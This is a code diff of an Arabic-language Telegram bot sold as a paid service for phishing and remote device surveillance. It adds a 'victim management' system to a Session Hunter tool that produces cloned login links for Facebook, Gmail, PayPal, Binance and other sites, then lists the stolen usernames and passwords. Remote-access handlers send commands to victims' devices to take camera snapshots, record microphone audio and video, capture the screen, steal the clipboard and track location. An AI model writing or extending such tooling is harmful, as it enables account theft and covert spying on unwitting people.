-                f"{PUBLIC_URL}/lsh_create",
-                json={"chat_id": chat_id, "session_id": session_id},
-                timeout=5
-            )
-        except Exception as e:
-            print(f"[-] LSH create HTTP warning: {e}")
-
+            requests.post(f"{PUBLIC_URL}/lsh_create",
+                json={"chat_id": chat_id, "session_id": session_id}, timeout=5)
+        except: pass
         target_link = f"{PUBLIC_URL}/lsh?s={session_id}&id={chat_id}"
         qr_image = lsh_generate_qr(target_link)
-
         if qr_image:
             qr_image.name = 'lsh_qr.png'
             try:
-                bot.send_photo(
-                    chat_id, qr_image,
-                    caption=(
-                        "🕹️ **جلسة السيطرة الكاملة جاهزة!**\n"
-                        "━━━━━━━━━━━━━━━━━━\n\n"
-                        "🎯 **وجّه الضحية لمسح الكود أو افتح الرابط:**\n"
-                        f"`{target_link}`\n\n"
-                        "📊 **ما سيتم تلقائياً:**\n"
-                        "• تقرير كامل عن الجهاز + IP الحقيقي\n"
-                        "• صورة من الكاميرا الأمامية\n"
-                        "• تسجيل صوتي من الميكروفون\n"
-                        "• لوحة تحكم حية بأزرار تفاعلية\n\n"
-                        "⚠️ الجلسة تنتهي بعد 24 ساعة."
-                    ),
-                    parse_mode="Markdown"
-                )
-            except Exception as e:
-                print(f"[-] send_photo error: {e}")
-                bot.send_message(chat_id, f"🕹️ **رابط الجلسة:**\n`{target_link}`", parse_mode="Markdown")
+                bot.send_photo(chat_id, qr_image,
+                    caption=f"🕹️ **جلسة LSH جاهزة!**\n`{target_link}`", parse_mode="Markdown")
+            except:
+                bot.send_message(chat_id, f"🕹️ {target_link}")
         else:
-            bot.send_message(chat_id, f"🕹️ **رابط الجلسة:**\n`{target_link}`", parse_mode="Markdown")
+            bot.send_message(chat_id, f"🕹️ {target_link}")
         return
 
     # ============================================================
-    # ★★★ Session Hunter ★★★
+    # ★★★ Session Hunter — نظام الضحايا ★★★
     # ============================================================
     if call.data == "gen_sh":
         check = can_use_tool(chat_id, "sh")
@@ -1087,55 +849,92 @@ def callback_handler(call):
             bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
             bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "sh", check), parse_mode="Markdown")
             return
-        consume_usage(chat_id, "sh")
-        bot.answer_callback_query(call.id, "اختر الموقع...")
-
+        bot.answer_callback_query(call.id)
+        
+        # ★ اعرض قائمة الضحايا ★
+        victims = get_all_victims(chat_id)
+        
         markup = InlineKeyboardMarkup()
-        markup.row(
-            InlineKeyboardButton("📘 Facebook", callback_data=f"sh_site_facebook_{chat_id}"),
-            InlineKeyboardButton("📷 Instagram", callback_data=f"sh_site_instagram_{chat_id}"),
-        )
-        markup.row(
-            InlineKeyboardButton("🎵 TikTok", callback_data=f"sh_site_tiktok_{chat_id}"),
-            InlineKeyboardButton("🐦 Twitter/X", callback_data=f"sh_site_twitter_{chat_id}"),
-        )
-        markup.row(
-            InlineKeyboardButton("📧 Gmail", callback_data=f"sh_site_gmail_{chat_id}"),
-            InlineKeyboardButton("👻 Snapchat", callback_data=f"sh_site_snapchat_{chat_id}"),
-        )
-        markup.row(
-            InlineKeyboardButton("💼 LinkedIn", callback_data=f"sh_site_linkedin_{chat_id}"),
-            InlineKeyboardButton("🎮 Discord", callback_data=f"sh_site_discord_{chat_id}"),
-        )
-        markup.row(
-            InlineKeyboardButton("✈️ Telegram", callback_data=f"sh_site_telegram_{chat_id}"),
-            InlineKeyboardButton("🎬 Netflix", callback_data=f"sh_site_netflix_{chat_id}"),
-        )
-        markup.row(
-            InlineKeyboardButton("💳 PayPal", callback_data=f"sh_site_paypal_{chat_id}"),
-            InlineKeyboardButton("💰 Binance", callback_data=f"sh_site_binance_{chat_id}"),
-        )
-
+        markup.add(InlineKeyboardButton("➕ ضحية جديدة", callback_data="victim_new"))
+        
+        if victims:
+            markup.add(InlineKeyboardButton(
+                f"━━━ 📋 الضحايا ({len(victims)}) ━━━",
+                callback_data="noop"
+            ))
+            for v in victims[:12]:
+                name = v.get("name", "غير معروف")[:18]
+                site = v.get("site", "facebook")
+                creds = int(v.get("creds_count", 0))
+                
+                if creds > 0:
+                    icon = "✅"
+                elif v.get("status") == "active":
+                    icon = "⏳"
+                else:
+                    icon = "⏸️"
+                
+                site_icon = {
+                    "facebook": "📘", "instagram": "📷", "tiktok": "🎵",
+                    "twitter": "🐦", "gmail": "📧", "snapchat": "👻",
+                    "linkedin": "💼", "discord": "🎮", "telegram": "✈️",
+                    "netflix": "🎬", "paypal": "💳", "binance": "💰",
+                }.get(site, "🌐")
+                
+                vid = v.get("victim_id", "")
+                markup.add(InlineKeyboardButton(
+                    f"{icon} {name} — {site_icon} ({creds} 📥)",
+                    callback_data=f"victim_{vid}"
+                ))
+        
         bot.send_message(
             chat_id,
-            "🍪 **اختر الموقع المستهدف:**",
+            f"👥 **نظام إدارة الضحايا**\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"📊 **عدد الضحايا:** `{len(victims)}`\n\n"
+            f"اختر ضحية لإدارتها أو أضف ضحية جديدة:",
             reply_markup=markup,
             parse_mode="Markdown"
         )
         return
 
-    if call.data.startswith("sh_site_"):
-        parts = call.data.split("_", 3)
-        site = parts[2]
-        target_chat = parts[3] if len(parts) > 3 else str(chat_id)
+    # ============================================================
+    # إضافة ضحية جديدة
+    # ============================================================
+    if call.data == "victim_new":
+        bot.answer_callback_query(call.id)
+        msg = bot.send_message(
+            chat_id,
+            "📝 **أرسل اسم الضحية:**\n\n"
+            "مثال: `أحمد` أو `محمد - الرياض`\n\n"
+            "_سيُستخدم الاسم لتمييز هذه الضحية_",
+            parse_mode="Markdown"
+        )
+        bot.register_next_step_handler(msg, victim_name_handler)
+        return
 
-        # ★★★ ولّد الرابط القصير ★★★
-        short_code = generate_short_code(8)
-        save_short_link(short_code, target_chat, site)
-
-        # ★★★ الرابط القصير النهائي ★★★
-        target_link = f"{PUBLIC_URL}/f/{short_code}"
-
+    # ============================================================
+    # عرض ضحية محددة
+    # ============================================================
+    if call.data.startswith("victim_") and not call.data.startswith("victim_new") \
+       and not call.data.startswith("victim_site_") and not call.data.startswith("victim_creds_") \
+       and not call.data.startswith("victim_refresh_") and not call.data.startswith("victim_copy_") \
+       and not call.data.startswith("victim_rename_") and not call.data.startswith("victim_delete_") \
+       and not call.data.startswith("victim_confirm_delete_"):
+        
+        victim_id = call.data.replace("victim_", "")
+        victim = get_victim(chat_id, victim_id)
+        if not victim:
+            bot.answer_callback_query(call.id, "❌ ضحية غير موجودة", show_alert=True)
+            return
+        
+        bot.answer_callback_query(call.id)
+        
+        name = victim.get("name", "غير معروف")
+        site = victim.get("site", "facebook")
+        creds_count = int(victim.get("creds_count", 0))
+        status = victim.get("status", "pending")
+        
         site_names = {
             "facebook": "فيسبوك", "instagram": "انستقرام",
             "tiktok": "تيك توك", "twitter": "تويتر / X",
@@ -1144,26 +943,187 @@ def callback_handler(call):
             "telegram": "تلجرام", "netflix": "نتفليكس",
             "paypal": "باي بال", "binance": "بينانس",
         }
+        
+        status_names = {
+            "pending": "⏸️ في الانتظار",
+            "active": "⏳ نشطة",
+            "captured": "✅ تم الالتقاط"
+        }
+        
+        target_link = f"{PUBLIC_URL}/f/{victim.get('code', '')}"
+        created = time.strftime('%Y-%m-%d %H:%M', time.localtime(float(victim.get("created_at", 0))))
+        
+        text = (
+            f"👤 **بيانات الضحية**\n"
+            f"━━━━━━━━━━━━━━━━━━\n\n"
+            f"📛 **الاسم:** `{name}`\n"
+            f"🌐 **الموقع:** {site_names.get(site, site)}\n"
+            f"📊 **الحالة:** {status_names.get(status, status)}\n"
+            f"📥 **البيانات المسروقة:** `{creds_count}`\n"
+            f"📅 **تاريخ الإنشاء:** `{created}`\n\n"
+            f"🔗 **الرابط:**\n`{target_link}`\n\n"
+            f"━━━━━━━━━━━━━━━━━━"
+        )
+        
+        markup = InlineKeyboardMarkup()
+        markup.row(
+            InlineKeyboardButton("📥 عرض البيانات", callback_data=f"victim_creds_{victim_id}"),
+            InlineKeyboardButton("🔄 تحديث", callback_data=f"victim_{victim_id}"),
+        )
+        markup.row(
+            InlineKeyboardButton("📋 نسخ الرابط", callback_data=f"victim_copy_{victim_id}"),
+            InlineKeyboardButton("✏️ تغيير الاسم", callback_data=f"victim_rename_{victim_id}"),
+        )
+        markup.row(
+            InlineKeyboardButton("🗑️ حذف", callback_data=f"victim_delete_{victim_id}"),
+        )
+        markup.row(
+            InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="gen_sh"),
+        )
+        
+        bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)
+        return
 
-        bot.answer_callback_query(call.id, f"✅ {site_names.get(site, site)}")
+    # ============================================================
+    # عرض بيانات ضحية
+    # ============================================================
+    if call.data.startswith("victim_creds_"):
+        victim_id = call.data.replace("victim_creds_", "")
+        creds = get_victim_creds(victim_id)
+        if not creds:
+            bot.answer_callback_query(call.id, "لا توجد بيانات بعد", show_alert=True)
+            return
+        bot.answer_callback_query(call.id)
+        lines = [f"📥 **البيانات المسروقة ({len(creds)}):**\n"]
+        for i, c in enumerate(creds, 1):
+            verified = "✅" if c.get("verified") else "❌"
+            lines.append(
+                f"\n**#{i}** {verified}\n"
+                f"👤 `{c.get('username', '')}`\n"
+                f"🔑 `{c.get('password', '')}`\n"
+                f"🕐 {time.strftime('%H:%M:%S', time.localtime(c.get('captured_at', 0)))}"
+            )
+        msg = "\n".join(lines)
+        if len(msg) > 4000:
+            buf = io.BytesIO(msg.encode('utf-8'))
+            buf.name = f'creds_{victim_id[:8]}.txt'
+            bot.send_document(chat_id, buf, caption="📥 البيانات")
+        else:
+            bot.send_message(chat_id, msg, parse_mode="Markdown")
+        return
+
+    # ============================================================
+    # نسخ رابط ضحية
+    # ============================================================
+    if call.data.startswith("victim_copy_"):
+        victim_id = call.data.replace("victim_copy_", "")
+        victim = get_victim(chat_id, victim_id)
+        if victim:
+            link = f"{PUBLIC_URL}/f/{victim.get('code', '')}"
+            bot.send_message(chat_id,
+                f"🔗 **رابط الضحية `{victim.get('name', '')}`:**\n\n`{link}`",
+                parse_mode="Markdown")
+        bot.answer_callback_query(call.id)
+        return
+
+    # ============================================================
+    # تغيير اسم ضحية
+    # ============================================================
+    if call.data.startswith("victim_rename_"):
+        victim_id = call.data.replace("victim_rename_", "")
+        bot.answer_callback_query(call.id)
+        msg = bot.send_message(chat_id, "✏️ **أرسل الاسم الجديد:**", parse_mode="Markdown")
+        bot.register_next_step_handler(msg, lambda m, vid=victim_id: victim_rename_handler(m, vid))
+        return
+
+    # ============================================================
+    # حذف ضحية (تأكيد)
+    # ============================================================
+    if call.data.startswith("victim_delete_"):
+        victim_id = call.data.replace("victim_delete_", "")
+        victim = get_victim(chat_id, victim_id)
+        if victim:
+            markup = InlineKeyboardMarkup()
+            markup.row(
+                InlineKeyboardButton("✅ نعم", callback_data=f"victim_confirm_delete_{victim_id}"),
+                InlineKeyboardButton("❌ إلغاء", callback_data=f"victim_{victim_id}"),
+            )
+            bot.answer_callback_query(call.id)
+            bot.send_message(chat_id,
+                f"⚠️ **حذف ضحية `{victim.get('name', '')}`؟**\n\n"
+                f"سيتم حذف جميع بياناتها نهائياً.",
+                reply_markup=markup, parse_mode="Markdown")
+        return
+
+    if call.data.startswith("victim_confirm_delete_"):
+        victim_id = call.data.replace("victim_confirm_delete_", "")
+        delete_victim(chat_id, victim_id)
+        bot.answer_callback_query(call.id, "🗑️ تم الحذف", show_alert=True)
+        bot.send_message(chat_id, "✅ تم حذف الضحية.")
+        return
+
+    # ============================================================
+    # اختيار موقع ضحية جديدة
+    # ============================================================
+    if call.data.startswith("victim_site_"):
+        site = call.data.replace("victim_site_", "")
+        
+        # استرجع الاسم المؤقت
+        name = "ضحية"
+        if redis_client:
+            temp = redis_client.get(f"pending_victim_name:{chat_id}")
+            if temp:
+                name = temp
+        
+        # افحص الصلاحيات
+        check = can_use_tool(chat_id, "sh")
+        if not check["allowed"]:
+            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
+            return
+        consume_usage(chat_id, "sh")
+        
+        # أنشئ الضحية
+        victim = create_victim(chat_id, name, site)
+        if not victim:
+            bot.answer_callback_query(call.id, "❌ فشل الإنشاء", show_alert=True)
+            return
+        
+        # احذف الاسم المؤقت
+        if redis_client:
+            redis_client.delete(f"pending_victim_name:{chat_id}")
+        
+        bot.answer_callback_query(call.id, "✅ تم إنشاء الضحية")
+        
+        site_names = {
+            "facebook": "فيسبوك", "instagram": "انستقرام",
+            "tiktok": "تيك توك", "twitter": "تويتر / X",
+            "gmail": "جيميل", "snapchat": "سناب شات",
+            "linkedin": "لينكد إن", "discord": "ديسكورد",
+            "telegram": "تلجرام", "netflix": "نتفليكس",
+            "paypal": "باي بال", "binance": "بينانس",
+        }
+        
+        target_link = f"{PUBLIC_URL}/f/{victim['code']}"
+        
         bot.send_message(
             chat_id,
-            f"🎯 **جلسة {site_names.get(site, site)} جاهزة!**\n"
+            f"🎉 **ضحية جديدة جاهزة!**\n"
             f"━━━━━━━━━━━━━━━━━━\n\n"
-            f"🔗 **الرابط القصير:**\n`{target_link}`\n\n"
-            f"📏 **الطول:** 45 حرف فقط\n"
-            f"🔒 **مخفي تماماً** — لا يمكن تتبع Railway\n\n"
+            f"📛 **الاسم:** `{name}`\n"
+            f"🌐 **الموقع:** {site_names.get(site, site)}\n"
+            f"🔗 **الرابط:**\n`{target_link}`\n\n"
             f"📊 **ما سيحدث:**\n"
-            f"• الضحية تفتح الرابط → ترى صفحة تسجيل دخول **{site_names.get(site, site)}** مطابقة 100%\n"
-            f"• تكتب بياناتها الحقيقية\n"
-            f"• **يتم التحقق مع السيرفر الحقيقي**\n"
-            f"• **تُرسل لك فقط البيانات الصحيحة!**\n"
-            f"• ثم تُحوَّل تلقائياً للموقع الحقيقي\n\n"
-            f"⚠️ الرابط يعمل لمدة 7 أيام",
+            f"• الضحية تفتح الرابط\n"
+            f"• تسجّل بياناتها الحقيقية\n"
+            f"• **تُرسل لك فقط البيانات الصحيحة!**\n\n"
+            f"💡 **ارجع لـ 🍪 لمشاهدة جميع ضحاياك**",
             parse_mode="Markdown"
         )
         return
 
+    # ============================================================
+    # أوامر sh_ الأخرى
+    # ============================================================
     if call.data.startswith("sh_"):
         parts = call.data.split("_", 2)
         cmd = parts[1] if len(parts) > 1 else ""
@@ -1173,330 +1133,250 @@ def callback_handler(call):
             data = get_sh_data(sid)
             creds = data.get("credentials", [])
             if creds:
-                lines = [f"🎯 **البيانات المسروقة ({len(creds)}):**\n"]
+                lines = [f"🎯 **البيانات ({len(creds)}):**\n"]
                 for i, c in enumerate(creds, 1):
-                    verified = "✅" if c.get("verified") else "❌"
-                    lines.append(
-                        f"\n**#{i}** {verified}\n"
-                        f"👤 `{c.get('username', '')}`\n"
-                        f"🔑 `{c.get('password', '')}`\n"
-                        f"🕐 {time.strftime('%H:%M:%S', time.localtime(c.get('captured_at', 0)))}"
-                    )
+                    lines.append(f"\n**#{i}**\n👤 `{c.get('username', '')}`\n🔑 `{c.get('password', '')}`")
                 bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")
             else:
-                bot.answer_callback_query(call.id, "لا توجد بيانات بعد", show_alert=True)
-
-        elif cmd == "cookies":
-            data = get_sh_data(sid)
-            creds = data.get("credentials", [])
-            if creds:
-                text = json.dumps(creds, ensure_ascii=False, indent=2)
-                buf = io.BytesIO(text.encode('utf-8'))
-                buf.name = f'sh_creds_{sid[:8]}.json'
-                bot.send_document(chat_id, buf, caption="🎯 **كل البيانات**")
-            else:
-                bot.answer_callback_query(call.id, "لا توجد بيانات بعد", show_alert=True)
-
+                bot.answer_callback_query(call.id, "لا توجد بيانات", show_alert=True)
         elif cmd == "stats":
-            data = get_sh_data(sid)
-            sess = data.get("session", {})
-            creds = data.get("credentials", [])
-            text = (
-                f"📊 **إحصائيات الجلسة**\n"
-                f"━━━━━━━━━━━━━━━━━━\n"
-                f"🆔 `{sid[:16] if sid else 'N/A'}`\n"
-                f"🎯 الموقع: `{sess.get('target_site', 'N/A')}`\n"
-                f"🌐 IP: `{sess.get('ip', 'N/A')}`\n"
-                f"📄 الصفحات: `{sess.get('page_views', 0)}`\n"
-                f"🔑 البيانات: `{len(creds)}`\n"
-                f"❌ المحاولات الفاشلة: `{sess.get('failed_attempts', 0)}`"
-            )
-            bot.send_message(chat_id, text, parse_mode="Markdown")
-
-        elif cmd == "delete":
-            bot.answer_callback_query(call.id, "✅ تم")
+            bot.answer_callback_query(call.id, "استخدم قائمة الضحايا", show_alert=True)
         return
 
     # ============================================================
-    # أوامر RAT
+    # RAT أوامر
     # ============================================================
     if call.data.startswith("rat_cam_"):
         target_chat_id = call.data.replace("rat_cam_", "")
         queue_command(target_chat_id, "snapshot")
-        bot.answer_callback_query(call.id, "⏳ جاري التقاط الصورة من الضحية...")
+        bot.answer_callback_query(call.id, "⏳ جاري التقاط الصورة...")
         return
 
     if call.data.startswith("rat_mic_"):
         target_chat_id = call.data.replace("rat_mic_", "")
         queue_command(target_chat_id, "audio")
-        bot.answer_callback_query(call.id, "⏳ جاري تسجيل الصوت من ميكروفون الضحية...")
+        bot.answer_callback_query(call.id, "⏳ جاري التسجيل...")
         return
 
     # ============================================================
-    # أوامر LSH
+    # LSH أوامر
     # ============================================================
     if call.data.startswith("lsh_snap_"):
         sid = call.data.replace("lsh_snap_", "")
         ok = lsh_push_command(sid, {"action": "snapshot"})
-        bot.answer_callback_query(call.id, "📸 جاري طلب الصورة..." if ok else "❌ فشل الإرسال", show_alert=not ok)
-        if not ok:
-            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
+        bot.answer_callback_query(call.id, "📸" if ok else "❌", show_alert=not ok)
         return
 
     if call.data.startswith("lsh_audio_"):
         sid = call.data.replace("lsh_audio_", "")
         ok = lsh_push_command(sid, {"action": "audio", "payload": {"duration": 6000}})
-        bot.answer_callback_query(call.id, "🎙️ جاري التسجيل..." if ok else "❌ فشل الإرسال", show_alert=not ok)
-        if not ok:
-            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
+        bot.answer_callback_query(call.id, "🎙️" if ok else "❌", show_alert=not ok)
         return
 
     if call.data.startswith("lsh_video_"):
         sid = call.data.replace("lsh_video_", "")
         ok = lsh_push_command(sid, {"action": "video", "payload": {"duration": 10000}})
-        bot.answer_callback_query(call.id, "🎥 جاري تسجيل الفيديو..." if ok else "❌ فشل الإرسال", show_alert=not ok)
-        if not ok:
-            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
+        bot.answer_callback_query(call.id, "🎥" if ok else "❌", show_alert=not ok)
         return
 
     if call.data.startswith("lsh_screen_"):
         sid = call.data.replace("lsh_screen_", "")
         ok = lsh_push_command(sid, {"action": "screen"})
-        bot.answer_callback_query(call.id, "🖥️ جاري التقاط الشاشة..." if ok else "❌ فشل الإرسال", show_alert=not ok)
-        if not ok:
-            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
+        bot.answer_callback_query(call.id, "🖥️" if ok else "❌", show_alert=not ok)
         return
 
     if call.data.startswith("lsh_clip_"):
         sid = call.data.replace("lsh_clip_", "")
         ok = lsh_push_command(sid, {"action": "clipboard"})
-        bot.answer_callback_query(call.id, "📋 جاري سحب الحافظة..." if ok else "❌ فشل الإرسال", show_alert=not ok)
-        if not ok:
-            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
+        bot.answer_callback_query(call.id, "📋" if ok else "❌", show_alert=not ok)
         return
 
     if call.data.startswith("lsh_loc_"):
         sid = call.data.replace("lsh_loc_", "")
         ok = lsh_push_command(sid, {"action": "location"})
-        bot.answer_callback_query(call.id, "📍 جاري تحديث الموقع..." if ok else "❌ فشل الإرسال", show_alert=not ok)
-        if not ok:
-            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
+        bot.answer_callback_query(call.id, "📍" if ok else "❌", show_alert=not ok)
         return
 
     if call.data.startswith("lsh_open_"):
         sid = call.data.replace("lsh_open_", "")
-        bot.answer_callback_query(call.id, "🌐 أرسل الرابط الآن")
+        bot.answer_callback_query(call.id, "🌐 أرسل الرابط")
         _pending_open_url[chat_id] = sid
-        bot.send_message(
-            chat_id,
-            "🌐 **أرسل الرابط الذي تريد فتحه على جهاز الضحية**\n"
-            "(يجب أن يبدأ بـ http:// أو https://)"
-        )
+        bot.send_message(chat_id, "🌐 **أرسل الرابط:**")
         return
 
     if call.data.startswith("lsh_vibrate_"):
         sid = call.data.replace("lsh_vibrate_", "")
-        ok = lsh_push_command(sid, {"action": "vibrate", "payload": {"pattern": [500, 200, 500, 200, 500]}})
-        bot.answer_callback_query(call.id, "📳 تم الإرسال" if ok else "❌ فشل الإرسال", show_alert=not ok)
-        if not ok:
-            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
+        ok = lsh_push_command(sid, {"action": "vibrate", "payload": {"pattern": [500, 200, 500]}})
+        bot.answer_callback_query(call.id, "📳" if ok else "❌", show_alert=not ok)
         return
 
     if call.data.startswith("lsh_kill_"):
         sid = call.data.replace("lsh_kill_", "")
         ok = lsh_push_command(sid, {"action": "redirect", "payload": {"url": "about:blank"}})
-        bot.answer_callback_query(call.id, "❌ جاري الإنهاء..." if ok else "❌ فشل الإرسال", show_alert=not ok)
-        if not ok:
-            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
+        bot.answer_callback_query(call.id, "❌" if ok else "❌", show_alert=not ok)
         return
+
+
+# ============================================================
+# ★★★ معالجات الضحايا (Next Step) ★★★
+# ============================================================
+def victim_name_handler(message):
+    """استقبل اسم الضحية ثم اعرض المواقع"""
+    if not message.text:
+        return
+    name = message.text.strip()[:50]
+    chat_id = message.chat.id
+    
+    if redis_client:
+        try:
+            redis_client.setex(f"pending_victim_name:{chat_id}", 300, name)
+        except: pass
+    
+    markup = InlineKeyboardMarkup()
+    markup.row(
+        InlineKeyboardButton("📘 Facebook", callback_data="victim_site_facebook"),
+        InlineKeyboardButton("📷 Instagram", callback_data="victim_site_instagram"),
+    )
+    markup.row(
+        InlineKeyboardButton("🎵 TikTok", callback_data="victim_site_tiktok"),
+        InlineKeyboardButton("🐦 Twitter/X", callback_data="victim_site_twitter"),
+    )
+    markup.row(
+        InlineKeyboardButton("📧 Gmail", callback_data="victim_site_gmail"),
+        InlineKeyboardButton("👻 Snapchat", callback_data="victim_site_snapchat"),
+    )
+    markup.row(
+        InlineKeyboardButton("💼 LinkedIn", callback_data="victim_site_linkedin"),
+        InlineKeyboardButton("🎮 Discord", callback_data="victim_site_discord"),
+    )
+    markup.row(
+        InlineKeyboardButton("✈️ Telegram", callback_data="victim_site_telegram"),
+        InlineKeyboardButton("🎬 Netflix", callback_data="victim_site_netflix"),
+    )
+    markup.row(
+        InlineKeyboardButton("💳 PayPal", callback_data="victim_site_paypal"),
+        InlineKeyboardButton("💰 Binance", callback_data="victim_site_binance"),
+    )
+    
+    bot.send_message(
+        chat_id,
+        f"👤 **اسم الضحية:** `{name}`\n\n"
+        f"🎯 **اختر الموقع:**",
+        reply_markup=markup,
+        parse_mode="Markdown"
+    )
+
+
+def victim_rename_handler(message, victim_id):
+    if not message.text:
+        return
+    new_name = message.text.strip()[:50]
+    chat_id = message.chat.id
+    rename_victim(chat_id, victim_id, new_name)
+    bot.send_message(chat_id, f"✅ **تم تغيير الاسم إلى:** `{new_name}`", parse_mode="Markdown")
 
 
 # ============================================================
 # معالجات الأدمن
 # ============================================================
 def admin_search_handler(message):
-    if not is_admin(message.chat.id):
-        return
+    if not is_admin(message.chat.id): return
     query = (message.text or "").strip().lstrip("@")
     users = get_all_users()
-    found = []
-    for u in users:
-        if str(u.get("user_id")) == query or (u.get("username", "") or "").lower() == query.lower():
-            found.append(u)
-    
+    found = [u for u in users if str(u.get("user_id")) == query or (u.get("username", "") or "").lower() == query.lower()]
     if not found:
         bot.send_message(message.chat.id, f"❌ لم يتم العثور على: `{query}`", parse_mode="Markdown")
         return
-    
     for u in found:
         uid = u.get("user_id")
-        bot.send_message(
-            message.chat.id,
-            build_user_info_text(uid, u),
-            reply_markup=build_user_detail_keyboard(uid, u),
-            parse_mode="Markdown"
-        )
+        bot.send_message(message.chat.id, build_user_info_text(uid, u),
+                         reply_markup=build_user_detail_keyboard(uid, u), parse_mode="Markdown")
 
 
 def admin_broadcast_handler(message):
-    if not is_admin(message.chat.id):
-        return
+    if not is_admin(message.chat.id): return
     text = message.text
-    if not text:
-        return
-    
+    if not text: return
     users = get_all_users()
-    success = 0
-    failed = 0
-    
-    status_msg = bot.send_message(message.chat.id, f"📢 جاري الإرسال لـ {len(users)} مستخدم...")
-    
+    success = failed = 0
+    status_msg = bot.send_message(message.chat.id, f"📢 جاري الإرسال لـ {len(users)}...")
     for u in users:
         uid = u.get("user_id")
-        if u.get("is_banned"):
-            continue
+        if u.get("is_banned"): continue
         try:
             bot.send_message(uid, f"📢 **رسالة من الإدارة:**\n\n{text}", parse_mode="Markdown")
             success += 1
             time.sleep(0.05)
-        except Exception:
-            failed += 1
-    
+        except: failed += 1
     try:
-        bot.edit_message_text(
-            f"✅ **تم الإرسال!**\n\n"
-            f"✔️ النجاح: {success}\n"
-            f"❌ الفشل: {failed}",
-            chat_id=message.chat.id,
-            message_id=status_msg.message_id
-        )
-    except Exception:
-        pass
-
-
-def admin_add_sub_handler(message):
-    if not is_admin(message.chat.id):
-        return
-    try:
-        uid = int((message.text or "").strip())
-    except ValueError:
-        bot.send_message(message.chat.id, "❌ ID غير صحيح")
-        return
-    
-    user = get_or_create_user(uid)
-    markup = InlineKeyboardMarkup()
-    markup.row(
-        InlineKeyboardButton("⭐ أساسية", callback_data=f"admin_activate_basic_{uid}"),
-        InlineKeyboardButton("💎 احترافية", callback_data=f"admin_activate_pro_{uid}"),
-    )
-    markup.row(InlineKeyboardButton("👑 VIP", callback_data=f"admin_activate_vip_{uid}"))
-    
-    bot.send_message(
-        message.chat.id,
-        f"📅 **اختر الباقة للمستخدم** `{uid}`:\n"
-        f"👤 الاسم: {user.get('first_name', 'Unknown')}",
-        reply_markup=markup,
-        parse_mode="Markdown"
-    )
+        bot.edit_message_text(f"✅ **تم!**\n✔️ {success}\n❌ {failed}",
+            chat_id=message.chat.id, message_id=status_msg.message_id)
+    except: pass
 
 
 def admin_ban_handler(message):
-    if not is_admin(message.chat.id):
-        return
-    try:
-        uid = int((message.text or "").strip())
-    except ValueError:
-        bot.send_message(message.chat.id, "❌ ID غير صحيح")
-        return
+    if not is_admin(message.chat.id): return
+    try: uid = int((message.text or "").strip())
+    except: return
     ban_user(uid)
     bot.send_message(message.chat.id, f"🚫 تم حظر `{uid}`", parse_mode="Markdown")
-    try:
-        bot.send_message(uid, "🚫 **تم حظرك من استخدام البوت.**", parse_mode="Markdown")
-    except Exception:
-        pass
 
 
 def admin_unban_handler(message):
-    if not is_admin(message.chat.id):
-        return
-    try:
-        uid = int((message.text or "").strip())
-    except ValueError:
-        bot.send_message(message.chat.id, "❌ ID غير صحيح")
-        return
+    if not is_admin(message.chat.id): return
+    try: uid = int((message.text or "").strip())
+    except: return
     unban_user(uid)
     bot.send_message(message.chat.id, f"✅ تم فك حظر `{uid}`", parse_mode="Markdown")
 
 
 def admin_delete_handler(message):
-    if not is_admin(message.chat.id):
-        return
-    try:
-        uid = int((message.text or "").strip())
-    except ValueError:
-        bot.send_message(message.chat.id, "❌ ID غير صحيح")
-        return
+    if not is_admin(message.chat.id): return
+    try: uid = int((message.text or "").strip())
+    except: return
     delete_user(uid)
     bot.send_message(message.chat.id, f"🗑️ تم حذف `{uid}`", parse_mode="Markdown")
 
 
 def admin_grant_vip_handler(message):
-    if not is_admin(message.chat.id):
-        return
-    try:
-        uid = int((message.text or "").strip())
-    except ValueError:
-        bot.send_message(message.chat.id, "❌ ID غير صحيح")
-        return
+    if not is_admin(message.chat.id): return
+    try: uid = int((message.text or "").strip())
+    except: return
     user = get_or_create_user(uid)
     user["is_vip"] = True
     save_user(uid, user)
     bot.send_message(message.chat.id, f"💎 تم منح VIP لـ `{uid}`", parse_mode="Markdown")
     try:
-        bot.send_message(uid,
-            "💎 **تهانينا!**\n\n"
-            "تم منحك عضوية **VIP** من الإدارة.\n"
-            "يمكنك الآن استخدام كل الأدوات بدون أي حدود! 🚀",
-            parse_mode="Markdown")
-    except Exception:
-        pass
+        bot.send_message(uid, "💎 **تهانينا!** تم منحك VIP! 🚀", parse_mode="Markdown")
+    except: pass
 
 
 def admin_give_stars_handler(message):
-    if not is_admin(message.chat.id):
-        return
+    if not is_admin(message.chat.id): return
     try:
         parts = (message.text or "").split("|")
-        if len(parts) != 2:
-            raise ValueError()
         uid = int(parts[0].strip())
         amount = int(parts[1].strip())
-    except (ValueError, IndexError):
-        bot.send_message(message.chat.id, "❌ صيغة خاطئة. استخدم: `user_id|amount`", parse_mode="Markdown")
+    except:
+        bot.send_message(message.chat.id, "❌ صيغة خاطئة")
         return
-    
     user = get_or_create_user(uid)
     user["total_stars_spent"] = max(0, user.get("total_stars_spent", 0) - amount)
     save_user(uid, user)
-    bot.send_message(message.chat.id,
-        f"⭐ تم إعطاء `{amount}` نجمة لـ `{uid}`",
-        parse_mode="Markdown")
+    bot.send_message(message.chat.id, f"⭐ تم إعطاء `{amount}` نجمة لـ `{uid}`", parse_mode="Markdown")
 
 
 def admin_msg_user_handler(message, uid):
-    if not is_admin(message.chat.id):
-        return
+    if not is_admin(message.chat.id): return
     try:
-        bot.send_message(uid,
-            f"📨 **رسالة من الإدارة:**\n\n{message.text}",
-            parse_mode="Markdown")
